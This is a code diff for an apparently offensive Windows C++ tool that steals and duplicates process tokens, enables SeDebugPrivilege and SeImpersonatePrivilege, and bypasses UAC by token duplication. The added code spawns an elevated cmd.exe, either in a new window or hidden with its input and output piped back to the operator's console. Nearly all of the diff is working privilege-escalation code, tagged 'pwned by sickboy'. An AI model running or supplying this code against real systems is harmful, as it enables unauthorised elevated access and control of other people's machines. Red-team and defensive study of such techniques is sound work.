@@ -8,7 +8,7 @@
 #include <process.h>
 #include <strsafe.h>
 #include <boost/program_options.hpp>
-#include "DebugPrivilege.h"
+#include "EnablePrivilege.h"
 
 #define MAX_NAME 256
 #define BUFSIZE 4096 
@@ -22,7 +22,7 @@ void spawn(DWORD);
 void spawn(DWORD, LPCWSTR, LPWSTR);
 void maketoken(LPWSTR, LPWSTR, LPWSTR);
 void redirectChildToParent(DWORD pid);
-void bypassUAC();
+void bypassUAC(BOOL);
 
 
 int main(int argc, char* argv[]) {
@@ -32,6 +32,7 @@ int main(int argc, char* argv[]) {
 	po::options_description impersonate_desc("Impersonation Options");
 	po::options_description exec_desc("Execution Options");
 	po::options_description exec_literal("");
+	po::options_description uacbypass_literal("");
 	po::options_description maketoken_desc("Make Token Options");
 	po::options_description uacbypass_desc("UAC Bypass Options");
 	//General menu options
@@ -62,7 +63,12 @@ int main(int argc, char* argv[]) {
 		("domain", po::value <std::string>(), "The domain the user belongs, if domain isn't specified the local machine will be used.")
 		;
 	//UAC Bypass Menu
-	uacbypass_desc.add_options() ("pwnuac", "Will try to bypass UAC using the token-duplication method.");
+	uacbypass_desc.add_options() 
+		("pwnuac", "Will try to bypass UAC using the token-duplication method.")
+		("spawn", "Spawns a new elevated prompt.")
+		;
+	//UAC literal options
+	uacbypass_literal.add_options() ("pwnuac", "Will try to bypass UAC using the token-duplication method.");
 	//Next we will merge them for the help menu
 	// Declare an options description instance which will include
 	// all the options
@@ -118,8 +124,10 @@ int main(int argc, char* argv[]) {
 	} else if (vm.count("maketoken")) {
 		std::cout << maketoken_desc << std::endl;
 		ExitProcess(1);
+	} else if (vm.count("pwnuac") && vm.count("spawn")) {
+		bypassUAC(true);
 	} else if (vm.count("pwnuac")) {
-		bypassUAC();
+		bypassUAC(false);
 	} else {
 		printf("[-]Unknown Command\n");
 		ExitProcess(1);
@@ -136,7 +144,7 @@ void contextCheck() {
 	}
 	printf("[*]Enabling SeDebugPrivilege\n");
 	//Lets enable the SeDebugPrivilege
-	if (!EnableDebugPrivilege()) {
+	if (!EnablePrivilege(stringToLPWSTR(std::string("SeDebugPrivilege")))) {
 		printf("[-]Couldn't enable SeDebugPrivilege\nExiting...\n");
 		ExitProcess(-1);
 	} else {
@@ -204,6 +212,8 @@ void spawn(DWORD pid) {
 	startupInfo.cb = sizeof(STARTUPINFO);
 	//Now lest get a handle to the token of the pid we specified
 	HANDLE hTokenDuplicate = stealToken(pid);
+	//Just in case we try to enable SeImpersonatePrivilege
+	EnablePrivilege(stringToLPWSTR(std::string("SeImpersonatePrivilege")));
 	//Last thing we will create a new process using the duplicated token
 	if (CreateProcessWithTokenW(hTokenDuplicate, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &startupInfo, &processInformation) == 0) {
 		printf("CreateProcessWithTokenW() error : % u\n", GetLastError());
@@ -226,6 +236,8 @@ void spawn(DWORD pid, LPCWSTR prog, LPWSTR args) {
 	//Now lest get a handle to the token of the pid we specified
 	HANDLE hTokenDuplicate = stealToken(pid);
 	//Last thing we will create a new process using the duplicated token
+	//Just in case we try to enable SeImpersonatePrivilege
+	EnablePrivilege(stringToLPWSTR(std::string("SeImpersonatePrivilege")));
 	if (CreateProcessWithTokenW(hTokenDuplicate, LOGON_WITH_PROFILE, prog, args, CREATE_NO_WINDOW, NULL, NULL, &startupInfo, &processInformation) == 0) {
 		printf("CreateProcessWithTokenW() error : % u\n", GetLastError());
 		ExitProcess(-1);
@@ -286,6 +298,8 @@ void redirectChildToParent(DWORD pid) {
 	startupInfo.hStdOutput = childOutWrite;
 	//Now lest get a handle to the token of the pid we specified
 	HANDLE hTokenDuplicate = stealToken(pid);
+	//Just in case we try to enable SeImpersonatePrivilege
+	EnablePrivilege(stringToLPWSTR(std::string("SeImpersonatePrivilege")));
 	//Last thing we will create a new process using the duplicated token
 	if (CreateProcessWithTokenW(hTokenDuplicate, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NO_WINDOW, NULL, NULL, &startupInfo, &processInformation) == 0) {
 		printf("CreateProcessWithTokenW() error : % u\n", GetLastError());
@@ -441,7 +455,7 @@ void maketoken(LPWSTR username, LPWSTR password, LPWSTR domain) {
 }
 
 //This function tries to bypass UAC by using the token-duplication method
-void bypassUAC() {
+void bypassUAC(BOOL spawn) {
 	if (IsUserAnAdmin()) {
 		printf("[*]Already in elevated context!\n");
 		ExitProcess(1);
@@ -518,25 +532,128 @@ void bypassUAC() {
 		ExitProcess(-1);
 	}
 	printf("[+]ImpersonateLoggedOnUser() succeed!\n");
-	//Now lets spawn a command prompt using the new Impersonated context
-	STARTUPINFO si;
-	PROCESS_INFORMATION pi;
-	SecureZeroMemory(&si, sizeof(si));
-	SecureZeroMemory(&pi, sizeof(pi));
-	si.cb = sizeof(si);
-	printf("[*]Spawning new elevated process\n");
-	//Now lest create a process under the new elevated context
-	if (!CreateProcessWithLogonW(L"pwned", L"by", L"sickboy", LOGON_NETCREDENTIALS_ONLY, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
-		printf("CreateProcessWithLogonW() error : % u\n", GetLastError());
-		printf("[-]Target isn't vulnerable!\n");
-		ExitProcess(-1);
+	if (spawn) {
+		//Now lets spawn a command prompt using the new Impersonated context
+		STARTUPINFO si;
+		PROCESS_INFORMATION pi;
+		SecureZeroMemory(&si, sizeof(si));
+		SecureZeroMemory(&pi, sizeof(pi));
+		si.cb = sizeof(si);
+		printf("[*]Spawning new elevated process\n");
+		//Now lest create a process under the new elevated context
+		if (!CreateProcessWithLogonW(L"pwned", L"by", L"sickboy", LOGON_NETCREDENTIALS_ONLY, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+			printf("CreateProcessWithLogonW() error : % u\n", GetLastError());
+			printf("[-]Target isn't vulnerable!\n");
+			ExitProcess(-1);
+		}
+		printf("[+]Process spawned!\n");
+		//Closing handles
+		CloseHandle(hToken);
+		CloseHandle(hTokenDuplicate);
+		CloseHandle(hTokenRestricted);
+		CloseHandle(hTokenRestrictedDuplicate);
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
 	}
-	printf("[+]Process spawned!\n");
-	//Closing handles
-	CloseHandle(hToken);
-	CloseHandle(hTokenDuplicate);
-	CloseHandle(hTokenRestricted);
-	CloseHandle(hTokenRestrictedDuplicate);
-	CloseHandle(pi.hProcess);
-	CloseHandle(pi.hThread);
+	else {
+		BOOL bSuccess;
+		//Create two handles to our INPUT and OUTPUT
+		HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE);
+		HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE);
+		//Create handles for our inpout and output read/write operations of the child process
+		HANDLE childInRead = NULL;
+		HANDLE childInWrite = NULL;
+		HANDLE childOutRead = NULL;
+		HANDLE childOutWrite = NULL;
+		//Next we set the security attributes
+		SECURITY_ATTRIBUTES saAttr;
+		saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+		saAttr.bInheritHandle = TRUE;
+		saAttr.lpSecurityDescriptor = NULL;
+		//Create a pipe for the child process's STDOUT
+		if (!CreatePipe(&childOutRead, &childOutWrite, &saAttr, 0)) {
+			printf("CreatePipe() error : % u\n", GetLastError());
+			ExitProcess(-1);
+		}
+		//Ensure the read handle to the pipe for STDOUT is not inherited.
+		if (!SetHandleInformation(childOutRead, HANDLE_FLAG_INHERIT, 0)) {
+			printf("SetHandleInformation() error : % u\n", GetLastError());
+			ExitProcess(-1);
+		}
+		//Create a pipe for the child process's STDIN
+		if (!CreatePipe(&childInRead, &childInWrite, &saAttr, 0)) {
+			printf("CreatePipe() error : % u\n", GetLastError());
+			ExitProcess(-1);
+		}
+		//Ensure the write handle to the pipe for STDIN is not inherited.
+		if (!SetHandleInformation(childInWrite, HANDLE_FLAG_INHERIT, 0)) {
+			printf("SetHandleInformation() error : % u\n", GetLastError());
+			ExitProcess(-1);
+		}
+
+		//Next lets create and configure the structures the new process needs
+		STARTUPINFO startupInfo;
+		PROCESS_INFORMATION processInformation;
+		//Zeroing out memory for the two structures that will hold our new process info
+		SecureZeroMemory(&startupInfo, sizeof(STARTUPINFO));
+		SecureZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
+		//Setting the proper values of the STARTUPINFO structure
+		startupInfo.cb = sizeof(STARTUPINFO);
+		startupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+		startupInfo.wShowWindow = SW_HIDE;
+		startupInfo.hStdInput = childInRead;
+		startupInfo.hStdOutput = childOutWrite;
+		//First lets log user on the local computer with the set of creds
+		if (!CreateProcessWithLogonW(L"pwned", L"by", L"sickboy", LOGON_NETCREDENTIALS_ONLY, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NO_WINDOW, NULL, NULL, &startupInfo, &processInformation)) {
+			printf("CreateProcessWithLogonW() error : % u\n", GetLastError());
+			ExitProcess(-1);
+		}
+		printf("[+]Proccess spawned\n");
+		CloseHandle(childInRead);
+		CloseHandle(childOutWrite);
+		//Create a buffer and try to read and write on the pipes
+		CHAR chBuf[BUFSIZE];
+		DWORD dwRead, dwWritten;
+		//Last this we set a loop to read and write to the pipe of the child process
+		while (1) {
+			//Read once from the pipe
+			bSuccess = ReadFile(childOutRead, chBuf, BUFSIZE, &dwRead, NULL);
+			if (GetLastError() == ERROR_BROKEN_PIPE && bSuccess == 0) {
+				break;
+			} // child process exit.
+			bSuccess = WriteFile(hStdout, chBuf, dwRead, &dwWritten, NULL);
+			//Check if we have leftover data using PeekNamedPipe and another loop
+			while (1) {
+				DWORD bytesAvail = 0;
+				if (!PeekNamedPipe(childOutRead, NULL, BUFSIZE, NULL, &bytesAvail, NULL)) {
+					printf("PeekNamedPipe() error : % u\n", GetLastError());
+					ExitProcess(-1);
+				}
+				if (bytesAvail) {
+					//Read from pipe
+					bSuccess = ReadFile(childOutRead, chBuf, BUFSIZE, &dwRead, NULL);
+					if (GetLastError() == ERROR_BROKEN_PIPE && bSuccess == 0) {
+						break;
+					} // child process exit.
+					bSuccess = WriteFile(hStdout, chBuf, dwRead, &dwWritten, NULL);
+				}
+				else {
+					break;
+				}
+			}
+			//Write to pipe
+			bSuccess = ReadFile(hStdin, chBuf, BUFSIZE, &dwRead, NULL);
+			bSuccess = WriteFile(childInWrite, chBuf, dwRead, &dwWritten, NULL);
+			//A small sleep to give time to the write operation to execute before we try to read from the pipe again
+			Sleep(100);
+		}
+		WaitForSingleObject(processInformation.hProcess, INFINITE);
+		LocalFree(chBuf);
+		CloseHandle(hToken);
+		CloseHandle(hTokenDuplicate);
+		CloseHandle(hTokenRestricted);
+		CloseHandle(hTokenRestrictedDuplicate);
+		CloseHandle(processInformation.hProcess);
+		CloseHandle(processInformation.hThread);
+	}
 }
